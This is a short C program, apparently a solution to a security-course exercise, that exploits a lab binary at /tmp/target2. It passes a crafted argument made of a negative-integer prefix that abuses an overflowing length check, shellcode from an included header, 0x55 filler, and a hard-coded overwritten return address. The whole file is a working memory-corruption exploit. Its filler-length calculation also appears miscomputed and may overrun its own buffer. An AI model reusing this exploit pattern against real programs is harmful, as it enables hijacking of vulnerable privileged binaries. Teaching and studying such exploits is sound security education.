#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
	char *first = "-2147483379,";
	
	char arg1[8608];
	strcpy(arg1, first);
	strcat(arg1, shellcode);
	memset(arg1+strlen(first)+strlen(shellcode),0x55,8608-strlen(first)+strlen(shellcode));
	*(unsigned *)(&arg1[8592])=0xbeffba48;

	char *args[] = { TARGET, arg1, NULL };
	char *env[] = { NULL };

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
